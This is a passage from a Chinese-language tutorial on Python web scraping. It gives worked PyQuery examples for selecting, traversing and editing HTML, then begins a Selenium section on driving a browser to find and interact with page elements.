class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;</code></pre><h4 id="2-URL初始化"><a href="#2-URL初始化" class="headerlink" title="(2)URL初始化"></a><strong>(2)URL初始化</strong></h4><p><strong>实例代码：</strong></p><pre><code>from pyquery import PyQuery as pqdoc = pq(url=&apos;http://www.baidu.com&apos;)print(doc(&apos;head&apos;))</code></pre><p><strong>运行结果：</strong></p><pre><code>&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;/&gt;&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge&quot;/&gt;&lt;meta content=&quot;always&quot; name=&quot;referrer&quot;/&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://s1.bdstatic.com/r/www/cache/bdorz/baidu.min.css&quot;/&gt;&lt;title&gt;ç¾åº¦ä¸ä¸ï¼ä½ å°±ç¥é&lt;/title&gt;&lt;/head&gt;</code></pre><h4 id="3-文件初始化"><a href="#3-文件初始化" class="headerlink" title="(3)文件初始化"></a><strong>(3)文件初始化</strong></h4><p><strong>实例代码：</strong></p><pre><code>from pyquery import PyQuery as pqdoc = pq(filename=&apos;demo.html&apos;)print(doc(&apos;li&apos;))</code></pre><h3 id="2-基本CSS选择器"><a href="#2-基本CSS选择器" class="headerlink" title="2.基本CSS选择器"></a><strong>2.基本CSS选择器</strong></h3><p><strong>实例代码：</strong></p><pre><code>html = &apos;&apos;&apos;&lt;div id=&quot;container&quot;&gt;    &lt;ul class=&quot;list&quot;&gt;         &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;     &lt;/ul&gt; &lt;/div&gt;&apos;&apos;&apos;from pyquery import PyQuery as pqdoc = pq(html)print(doc(&apos;#container .list li&apos;))</code></pre><p><strong>运行结果：</strong></p><pre><code>&lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;&lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;</code></pre><h3 id="3-查找元素"><a href="#3-查找元素" class="headerlink" title="3.查找元素"></a><strong>3.查找元素</strong></h3><h4 id="1-子元素"><a href="#1-子元素" class="headerlink" title="(1)子元素"></a><strong>(1)子元素</strong></h4><p><strong>实例代码一：</strong></p><pre><code>html = &apos;&apos;&apos;&lt;div id=&quot;container&quot;&gt;    &lt;ul class=&quot;list&quot;&gt;         &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;     &lt;/ul&gt; &lt;/div&gt;&apos;&apos;&apos;from pyquery import PyQuery as pqdoc = pq(html)li = doc(&apos;.list&apos;).find(&apos;li&apos;)print(li)</code></pre><p><strong>运行结果：</strong></p><pre><code>&lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;&lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;</code></pre><p>当然，除了使用 find 方法以外，我们还能使用 children 方法</p><p><strong>实例代码二：</strong></p><pre><code>html = &apos;&apos;&apos;&lt;div id=&quot;container&quot;&gt;    &lt;ul class=&quot;list&quot;&gt;         &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;     &lt;/ul&gt; &lt;/div&gt;&apos;&apos;&apos;from pyquery import PyQuery as pqdoc = pq(html)items = doc(&apos;.list&apos;)lis = items.children(&apos;.active&apos;)print(lis)</code></pre><p><strong>运行结果：</strong></p><pre><code>&lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;</code></pre><h4 id="2-父元素"><a href="#2-父元素" class="headerlink" title="(2)父元素"></a><strong>(2)父元素</strong></h4><p><strong>实例代码一：</strong></p><pre><code>html = &apos;&apos;&apos;&lt;div id=&quot;container&quot;&gt;    &lt;ul class=&quot;list&quot;&gt;         &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;     &lt;/ul&gt; &lt;/div&gt;&apos;&apos;&apos;from pyquery import PyQuery as pqdoc = pq(html)items = doc(&apos;.list&apos;)container = items.parent()print(container)</code></pre><p><strong>运行结果：</strong></p><pre><code>&lt;div id=&quot;container&quot;&gt;    &lt;ul class=&quot;list&quot;&gt;         &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;     &lt;/ul&gt; &lt;/div&gt;</code></pre><p>使用 parent() 是返回直接父节点，但是使用 parents()能返回全部的父节点</p><p><strong>实例代码二：</strong></p><pre><code>html = &apos;&apos;&apos;&lt;div class=&quot;wrap&quot;&gt;    &lt;div id=&quot;container&quot;&gt;        &lt;ul class=&quot;list&quot;&gt;             &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;             &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;         &lt;/ul&gt;     &lt;/div&gt; &lt;/div&gt;&apos;&apos;&apos;from pyquery import PyQuery as pqdoc = pq(html)items = doc(&apos;.list&apos;)parents = items.parents(&apos;.wrap&apos;)print(parents)</code></pre><p><strong>运行结果：</strong></p><pre><code>&lt;div class=&quot;wrap&quot;&gt;    &lt;div id=&quot;container&quot;&gt;        &lt;ul class=&quot;list&quot;&gt;             &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;             &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;         &lt;/ul&gt;     &lt;/div&gt; &lt;/div&gt;</code></pre><h4 id="3-兄弟节点"><a href="#3-兄弟节点" class="headerlink" title="(3)兄弟节点"></a><strong>(3)兄弟节点</strong></h4><p><strong>实例代码：</strong></p><pre><code>html = &apos;&apos;&apos;&lt;div class=&quot;wrap&quot;&gt;    &lt;div id=&quot;container&quot;&gt;        &lt;ul class=&quot;list&quot;&gt;             &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;             &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;         &lt;/ul&gt;     &lt;/div&gt; &lt;/div&gt;&apos;&apos;&apos;from pyquery import PyQuery as pqdoc = pq(html)li = doc(&apos;.list .item-0.active&apos;)print(li.siblings(&apos;.active&apos;))</code></pre><p><strong>运行结果：</strong></p><pre><code>&lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;</code></pre><h3 id="4-遍历"><a href="#4-遍历" class="headerlink" title="4.遍历"></a><strong>4.遍历</strong></h3><p><strong>实例代码：</strong></p><pre><code>html = &apos;&apos;&apos;&lt;div class=&quot;wrap&quot;&gt;    &lt;div id=&quot;container&quot;&gt;        &lt;ul class=&quot;list&quot;&gt;             &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;             &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;         &lt;/ul&gt;     &lt;/div&gt; &lt;/div&gt;&apos;&apos;&apos;from pyquery import PyQuery as pqdoc = pq(html)lis = doc(&apos;li&apos;).items()for i in lis:    print(i)</code></pre><p><strong>运行结果：</strong></p><pre><code>&lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;&lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;</code></pre><h3 id="5-获取信息"><a href="#5-获取信息" class="headerlink" title="5.获取信息"></a><strong>5.获取信息</strong></h3><h4 id="1-获取属性"><a href="#1-获取属性" class="headerlink" title="(1)获取属性"></a><strong>(1)获取属性</strong></h4><p><strong>实例代码：</strong></p><pre><code>html = &apos;&apos;&apos;&lt;div class=&quot;wrap&quot;&gt;    &lt;div id=&quot;container&quot;&gt;        &lt;ul class=&quot;list&quot;&gt;             &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;             &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;         &lt;/ul&gt;     &lt;/div&gt; &lt;/div&gt;&apos;&apos;&apos;from pyquery import PyQuery as pqdoc = pq(html)a = doc(&apos;.list .item-0.active a&apos;)print(a.attr.href)print(a.attr(&apos;href&apos;))</code></pre><p><strong>运行结果：</strong></p><pre><code>link3.htmllink3.html</code></pre><h4 id="2-获取文本"><a href="#2-获取文本" class="headerlink" title="(2)获取文本"></a><strong>(2)获取文本</strong></h4><p><strong>实例代码：</strong></p><pre><code>html = &apos;&apos;&apos;&lt;div class=&quot;wrap&quot;&gt;    &lt;div id=&quot;container&quot;&gt;        &lt;ul class=&quot;list&quot;&gt;             &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;             &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;         &lt;/ul&gt;     &lt;/div&gt; &lt;/div&gt;&apos;&apos;&apos;from pyquery import PyQuery as pqdoc = pq(html)a = doc(&apos;.item-0.active a&apos;)print(a.text())</code></pre><p><strong>运行结果：</strong></p><pre><code>third item</code></pre><h4 id="3-获取-HTML"><a href="#3-获取-HTML" class="headerlink" title="(3)获取 HTML"></a><strong>(3)获取 HTML</strong></h4><p><strong>实例代码：</strong></p><pre><code>html = &apos;&apos;&apos;&lt;div class=&quot;wrap&quot;&gt;    &lt;div id=&quot;container&quot;&gt;        &lt;ul class=&quot;list&quot;&gt;             &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;             &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;         &lt;/ul&gt;     &lt;/div&gt; &lt;/div&gt;&apos;&apos;&apos;from pyquery import PyQuery as pqdoc = pq(html)li = doc(&apos;.item-0.active&apos;)print(li.html())</code></pre><p><strong>运行结果：</strong></p><pre><code>&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;</code></pre><h3 id="6-DOM操作"><a href="#6-DOM操作" class="headerlink" title="6.DOM操作"></a><strong>6.DOM操作</strong></h3><h4 id="1-addClass、removeClass"><a href="#1-addClass、removeClass" class="headerlink" title="(1)addClass、removeClass"></a><strong>(1)addClass、removeClass</strong></h4><p><strong>实例代码：</strong></p><pre><code>html = &apos;&apos;&apos;&lt;div class=&quot;wrap&quot;&gt;    &lt;div id=&quot;container&quot;&gt;        &lt;ul class=&quot;list&quot;&gt;             &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;             &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;         &lt;/ul&gt;     &lt;/div&gt; &lt;/div&gt;&apos;&apos;&apos;from pyquery import PyQuery as pqdoc = pq(html)li = doc(&apos;.item-0.active&apos;)print(li)li.removeClass(&apos;active&apos;)print(li)li.addClass(&apos;active&apos;)print(li)</code></pre><p><strong>运行结果：</strong></p><pre><code>&lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;</code></pre><h4 id="2-attr、css"><a href="#2-attr、css" class="headerlink" title="(2)attr、css"></a><strong>(2)attr、css</strong></h4><p><strong>实例代码：</strong></p><pre><code>html = &apos;&apos;&apos;&lt;div class=&quot;wrap&quot;&gt;    &lt;div id=&quot;container&quot;&gt;        &lt;ul class=&quot;list&quot;&gt;             &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;             &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;         &lt;/ul&gt;     &lt;/div&gt; &lt;/div&gt;&apos;&apos;&apos;from pyquery import PyQuery as pqdoc = pq(html)li = doc(&apos;.item-0.active&apos;)print(li)li.attr(&apos;name&apos;,&apos;link&apos;)print(li)li.css(&apos;front-size&apos;,&apos;14px&apos;)print(li)</code></pre><p><strong>运行结果：</strong></p><pre><code>&lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;item-0 active&quot; name=&quot;link&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;item-0 active&quot; name=&quot;link&quot; style=&quot;front-size: 14px&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;</code></pre><h4 id="3-remove"><a href="#3-remove" class="headerlink" title="(3)remove"></a><strong>(3)remove</strong></h4><p><strong>实例代码：</strong></p><pre><code>html = &apos;&apos;&apos;&lt;div class=&quot;wrap&quot;&gt;    Hello, World    &lt;p&gt;This is a paragraph.&lt;/p&gt; &lt;/div&gt;&apos;&apos;&apos;from pyquery import PyQuery as pqdoc = pq(html)wrap = doc(&apos;.wrap&apos;)print(wrap.text())wrap.find(&apos;p&apos;).remove()print(wrap.text())</code></pre><p><strong>运行结果：</strong></p><pre><code>Hello, WorldThis is a paragraph.Hello, World</code></pre><h4 id="4-其他-1"><a href="#4-其他-1" class="headerlink" title="(4)其他"></a><strong>(4)其他</strong></h4><p><a href="https://pyquery.readthedocs.io/en/latest/api.html" target="_blank" rel="noopener">https://pyquery.readthedocs.io/en/latest/api.html</a></p><h2 id="0X08-Selenium"><a href="#0X08-Selenium" class="headerlink" title="0X08 Selenium"></a><strong>0X08 Selenium</strong></h2><p>该函数库可以配合各种浏览器引擎以及 phantomJS 进行自动化测试工作，主要是为了解决 JS 动态渲染页面无法直接抓取的问题</p><h3 id="1-基本使用-1"><a href="#1-基本使用-1" class="headerlink" title="1.基本使用"></a><strong>1.基本使用</strong></h3><p><strong>实例代码：</strong></p><pre><code>from selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.common.keys import Keysfrom selenium.webdriver.support import expected_conditions as ECfrom selenium.webdriver.support.wait import WebDriverWaitbrowser = webdriver.Chrome()try:    browser.get(&apos;https://www.baidu.com&apos;)    input = browser.find_element_by_id(&apos;kw&apos;)    input.send_keys(&apos;Python&apos;)    input.send_keys(Keys.ENTER)    wait = WebDriverWait(browser, 10)    wait.until(EC.presence_of_element_located((By.ID, &apos;content_left&apos;)))    print(browser.current_url)    print(browser.get_cookies())    print(browser.page_source)finally:    browser.close()</code></pre><h3 id="2-声明对象"><a href="#2-声明对象" class="headerlink" title="2.声明对象"></a><strong>2.声明对象</strong></h3><pre><code>from selenium import webdriverbrowser = webdriver.Chrome()browser = webdriver.Firefox()browser = webdriver.Edge()browser = webdriver.PhantomJS()browser = webdriver.Safari()</code></pre><h3 id="3-访问页面"><a href="#3-访问页面" class="headerlink" title="3.访问页面"></a><strong>3.访问页面</strong></h3><pre><code>from selenium import webdriverbrowser = webdriver.Chrome()browser.get(&quot;https://www.baidu.com&quot;)print(browser.page_source)browser.close()</code></pre><h3 id="4-查找元素"><a href="#4-查找元素" class="headerlink" title="4.查找元素"></a><strong>4.查找元素</strong></h3><h4 id="1-查找单个元素"><a href="#1-查找单个元素" class="headerlink" title="(1)查找单个元素"></a><strong>(1)查找单个元素</strong></h4><p><strong>实例代码一：</strong></p><pre><code>from selenium import webdriverbrowser = webdriver.Chrome()browser.get(&apos;https://www.taobao.com&apos;)input_first = browser.find_element_by_id(&apos;q&apos;)input_second = browser.find_element_by_css_selector(&apos;#q&apos;)input_third = browser.find_element_by_xpath(&apos;//*[@id=&quot;q&quot;]&apos;)print(input_first, input_second, input_third)browser.close()</code></pre><p><strong>运行结果：</strong></p><pre><code>&lt;selenium.webdriver.remote.webelement.WebElement (session=&quot;06448c4d710820390f33d87c3033a505&quot;, element=&quot;0.38405353494037175-1&quot;)&gt; &lt;selenium.webdriver.remote.webelement.WebElement (session=&quot;06448c4d710820390f33d87c3033a505&quot;, element=&quot;0.38405353494037175-1&quot;)&gt; &lt;selenium.webdriver.remote.webelement.WebElement (session=&quot;06448c4d710820390f33d87c3033a505&quot;, element=&quot;0.38405353494037175-1&quot;)&gt;</code></pre><blockquote><p><strong>补充：</strong></p><p>除此之外还有一些查找元素的方法，如下</p><pre><code>find_element_by_namefind_element_by_xpathfind_element_by_link_textfind_element_by_partial_link_textfind_element_by_tag_namefind_element_by_class_namefind_element_by_css_selector</code></pre></blockquote><p><strong>实例代码二：</strong></p><pre><code>from selenium import webdriverfrom selenium.webdriver.common.by import Bybrowser = webdriver.Chrome()browser.get(&apos;https://www.taobao.com&apos;)input_first = browser.find_element(By.ID, &apos;q&apos;)print(input_first)browser.close()</code></pre><p><strong>运行结果：</strong></p><pre><code>&lt;selenium.webdriver.remote.webelement.WebElement (session=&quot;1f209c0d11551c40d9d20ad964fef244&quot;, element=&quot;0.07914603542731591-1&quot;)&gt;</code></pre><h4 id="2-查找多个元素"><a href="#2-查找多个元素" class="headerlink" title="(2)查找多个元素"></a><strong>(2)查找多个元素</strong></h4><p><strong>实例代码一：</strong></p><pre><code>from selenium import webdriverbrowser = webdriver.Chrome()browser.get(&apos;https://www.taobao.com&apos;)lis = browser.find_elements_by_css_selector(&apos;.service-bd li&apos;)print(lis)browser.close()</code></pre><p><strong>实例代码二：</strong></p><pre><code>from selenium import webdriverfrom selenium.webdriver.common.by import Bybrowser = webdriver.Chrome()browser.get(&apos;https://www.taobao.com&apos;)lis = browser.find_elements(By.CSS_SELECTOR, &apos;.service-bd li&apos;)print(lis)browser.close()</code></pre><blockquote><p><strong>补充：</strong></p><p>除了上面的查找方法，查找多个元素还有下面的一些常见的方法：</p><p>find_elements_by_name find_elements_by_xpath<br>find_elements_by_link_text find_elements_by_partial_link_text<br>find_elements_by_tag_name find_elements_by_class_name<br>find_elements_by_css_selector</p></blockquote><h4 id="3-元素的交互操作"><a href="#3-元素的交互操作" class="headerlink" title="(3)元素的交互操作"></a><strong>(3)元素的交互操作</strong></h4><p>我们可以对获取的元素调用交互方法</p><p><strong>实例代码：</strong></p><pre><code>from selenium import webdriverimport timebrowser = webdriver.Chrome()browser.get(&quot;http://www.taobao.com&quot;)input = browser.find_element_by_id(&apos;q&apos;)input.send_keys(&apos;iphone&apos;)time.sleep(1)input.clear()input.send_keys(&apos;ipad&apos;)button = browser.find_element_by_class_name(&apos;btn-search&apos;)button.click()</code></pre><blockquote><p><strong>补充：</strong></p><p><strong>官方文档:</strong><br><a href="http://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.remote.webelement" target="_blank" rel="noopener">http://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.remote.webelement</a></p></blockquote><h4 id="4-交互动作"><a href="#4-交互动作" class="headerlink" title="(4)交互动作"></a><strong>(4)交互动作</strong></h4><p>将动作附加到动作链中串行执行，这是我们使用 selenium 去模拟键鼠操作的非常常用的东西</p><p><strong>实例代码：</strong></p><pre><code>from selenium import webdriverfrom selenium.webdriver import ActionChainsbrowser = webdriver.Chrome()url = &apos;http://www.runoob.com/try/try.php?filename=jqueryui-api-droppable&apos;browser.get(url)browser.switch_to.frame(&apos;iframeResult&apos;)source = browser.find_element_by_css_selector(&apos;#draggable&apos;)target = browser.find_element_by_css_selector(&apos;#droppable&apos;)actions = ActionChains(browser)actions.drag_and_drop(source, target)actions.perform()</code></pre><blockquote><p><strong>补充：</strong></p><p><strong>官方文档:</strong><br><a href="http://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.common.action_chains" target="_blank" 